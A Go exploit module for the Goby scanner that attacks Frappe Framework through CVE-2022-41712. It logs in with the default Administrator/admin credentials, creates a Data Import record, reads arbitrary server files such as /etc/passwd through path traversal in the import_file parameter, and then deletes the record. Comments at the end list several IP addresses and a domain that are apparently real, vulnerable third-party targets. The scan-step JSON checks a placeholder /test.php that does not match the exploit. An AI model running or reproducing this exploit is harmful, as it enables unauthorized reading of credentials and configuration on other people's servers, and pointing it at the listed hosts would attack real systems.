package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	//"time"
)

func init() {
	expJson := `{
    "Name": "Frappe Framework frappe.core.doctype.data_import.data_import.get_preview_from_template import_file Arbitrary File Read Vulnerability (CVE-2022-41712)",
    "Description": "<p>Frappe Framework is a web development framework based on Python and Mariadb and integrated with front-end pages of Frappe Technologies in India.</p><p>Frappe Framework version 14.10.0 has an arbitrary file read vulnerability. An attacker can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in the extremely insecure state of the website.</p>",
    "Product": "Frappe Framework",
    "Homepage": "https://github.com/frappe/frappe",
    "DisclosureDate": "2022-09-28",
    "Author": "635477622@qq.com",
    "FofaQuery": "body=\"<meta name=\\\"generator\\\" content=\\\"frappe\" || body=\"frappe.ready_events.push(fn);\" || header=\"Link: </assets/frappe/js/lib/jquery/jquery.min.js\" || header=\"</assets/frappe/dist/js/frappe-web.bundle.7XJQJMPF.js\"",
    "GobyQuery": "body=\"<meta name=\\\"generator\\\" content=\\\"frappe\" || body=\"frappe.ready_events.push(fn);\" || header=\"Link: </assets/frappe/js/lib/jquery/jquery.min.js\" || header=\"</assets/frappe/dist/js/frappe-web.bundle.7XJQJMPF.js\"",
    "Level": "1",
    "Impact": "<p>An attacker can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in the extremely insecure state of the website.</p>",
    "Recommendation": "<p>At present, the manufacturer has issued an upgrade patch to fix the vulnerability. The patch access link is:<a href=\"https://github.com/frappe/frappe/releases/tag/v14.12.0\">https://github.com/frappe/frappe/releases/tag/v14.12.0</a></p>",
    "References": [
        "https://fluidattacks.com/advisories/kiniza/",
        "https://nvd.nist.gov/vuln/detail/CVE-2022-41712"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-41712"
    ],
    "CNNVD": [
        "CNNVD-202211-3495"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Frappe-Framework 框架 frappe.core.doctype.data_import.data_import.get_preview_from_template 文件 import_file 参数任意文件读取漏洞（CVE-2022-41712）",
            "Product": "Frappe-Framework",
            "Description": "<p>Frappe Framework 是印度Frappe Technologies公司的一个基于Python、Mariadb的并集成前端页面的Web开发框架。<br></p><p>Frappe Framework&nbsp;&nbsp;14.10.0版本存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。&nbsp;<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a target=\"_Blank\" href=\"https://github.com/frappe/frappe/releases/tag/v14.12.0\">https://github.com/frappe/frappe/releases/tag/v14.12.0</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。&nbsp;<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Frappe Framework frappe.core.doctype.data_import.data_import.get_preview_from_template import_file Arbitrary File Read Vulnerability (CVE-2022-41712)",
            "Product": "Frappe Framework",
            "Description": "<p>Frappe Framework is a web development framework based on Python and Mariadb and integrated with front-end pages of Frappe Technologies in India.<br></p><p>Frappe Framework version 14.10.0 has an arbitrary file read vulnerability. An attacker can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in the extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has issued an upgrade patch to fix the vulnerability. The patch access link is:<a target=\"_Blank\" href=\"https://github.com/frappe/frappe/releases/tag/v14.12.0\">https://github.com/frappe/frappe/releases/tag/v14.12.0</a><br></p>",
            "Impact": "<p>An attacker can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in the extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10809"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			flag := false
			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = true
			cfg.VerifyTls = false
			cfg.Data = "cmd=login&usr=Administrator&pwd=admin&device=desktop"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "\"message\":\"Logged In\",") {
					cookie := resp.Cookie

					// 创建模板 , 得到模板名 docName
					uri2 := "/api/method/frappe.desk.form.save.savedocs"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Header.Store("Cookie", cookie)
					cfg2.FollowRedirect = true
					cfg2.VerifyTls = false
					cfg2.Data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Data+Import%22%2C%22name%22%3A%22new-data-import-1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22Administrator%22%2C%22import_type%22%3A%22Insert+New+Records%22%2C%22status%22%3A%22Pending%22%2C%22submit_after_import%22%3A0%2C%22mute_emails%22%3A1%2C%22show_failed_logs%22%3A0%2C%22reference_doctype%22%3A%22User%22%7D&action=Save"
					// 提取 name 值
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						var data map[string]interface{}
						err := json.Unmarshal([]byte(resp2.Utf8Html), &data)
						if err != nil {
							return false
						}
						var docName string
						if docs, ok := data["docs"].([]interface{}); ok && len(docs) > 0 {
							if doc, ok := docs[0].(map[string]interface{}); ok {
								if n, ok := doc["name"].(string); ok {
									docName = n
								}
							}
						}
						docName = url.QueryEscape(docName)

						// 读文件
						uri3 := "/api/method/frappe.core.doctype.data_import.data_import.get_preview_from_template"
						cfg3 := httpclient.NewPostRequestConfig(uri3)
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg3.Header.Store("Cookie", cookie)
						cfg3.FollowRedirect = true
						cfg3.VerifyTls = false
						fileName := "/etc/passwd"
						cfg3.Data = "data_import=" + docName + "&import_file=../../../../../../../../../../../" + fileName
						resp3, _ := httpclient.DoHttpRequest(u, cfg3)
						if regexp.MustCompile("(?s)root:(x*?):0:0:").MatchString(resp3.Utf8Html) {
							flag = true
						}

						// 删除文件
						uri4 := "/api/method/frappe.desk.reportview.delete_items"
						cfg4 := httpclient.NewPostRequestConfig(uri4)
						cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg4.Header.Store("Cookie", cookie)
						cfg4.FollowRedirect = true
						cfg4.VerifyTls = false
						cfg4.Data = "items=%5B%22" + docName + "%22%5D&doctype=Data+Import"
						httpclient.DoHttpRequest(u, cfg4)

					}

				}
			}
			return flag
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)

			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = true
			cfg.VerifyTls = false
			cfg.Data = "cmd=login&usr=Administrator&pwd=admin&device=desktop"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "\"message\":\"Logged In\",") {
					cookie := resp.Cookie

					// 创建模板 , 得到模板名 docName
					uri2 := "/api/method/frappe.desk.form.save.savedocs"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Header.Store("Cookie", cookie)
					cfg2.FollowRedirect = true
					cfg2.VerifyTls = false
					cfg2.Data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Data+Import%22%2C%22name%22%3A%22new-data-import-1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22Administrator%22%2C%22import_type%22%3A%22Insert+New+Records%22%2C%22status%22%3A%22Pending%22%2C%22submit_after_import%22%3A0%2C%22mute_emails%22%3A1%2C%22show_failed_logs%22%3A0%2C%22reference_doctype%22%3A%22User%22%7D&action=Save"
					// 提取 name 值
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						var data map[string]interface{}
						err := json.Unmarshal([]byte(resp2.Utf8Html), &data)
						if err != nil {
							return expResult
						}
						var docName string
						if docs, ok := data["docs"].([]interface{}); ok && len(docs) > 0 {
							if doc, ok := docs[0].(map[string]interface{}); ok {
								if n, ok := doc["name"].(string); ok {
									docName = n
								}
							}
						}
						docName = url.QueryEscape(docName)

						// 读文件
						uri3 := "/api/method/frappe.core.doctype.data_import.data_import.get_preview_from_template"
						cfg3 := httpclient.NewPostRequestConfig(uri3)
						cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg3.Header.Store("Cookie", cookie)
						cfg3.FollowRedirect = true
						cfg3.VerifyTls = false

						cfg3.Data = "data_import=" + docName + "&import_file=../../../../../../../../../../../" + filePath
						resp3, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfg3)

						var result map[string]interface{}
						err2 := json.Unmarshal([]byte(resp3.Utf8Html), &result)
						if err2 != nil {
							panic(err2)
						}

						headerTitle := result["message"].(map[string]interface{})["columns"].([]interface{})[1].(map[string]interface{})["header_title"].(string)

						otherData := ""
						for _, row := range result["message"].(map[string]interface{})["data"].([]interface{}) {
							columns := row.([]interface{})
							for i := 1; i < len(columns); i++ {
								otherData += columns[i].(string) + "\n"
							}
						}

						expResult.Success = true
						expResult.Output = headerTitle + "\n" + otherData

						// 删除文件
						uri4 := "/api/method/frappe.desk.reportview.delete_items"
						cfg4 := httpclient.NewPostRequestConfig(uri4)
						cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg4.Header.Store("Cookie", cookie)
						cfg4.FollowRedirect = true
						cfg4.VerifyTls = false
						cfg4.Data = "items=%5B%22" + docName + "%22%5D&doctype=Data+Import"
						httpclient.DoHttpRequest(expResult.HostInfo, cfg4)

					}

				}
			}
			return expResult
		},
	))
}

//http://129.211.94.239
//http://143.244.149.231
//http://165.232.182.138
//http://35.200.223.24
//https://hokail.wajihah.sa
//http://165.22.214.164
//http://144.126.222.6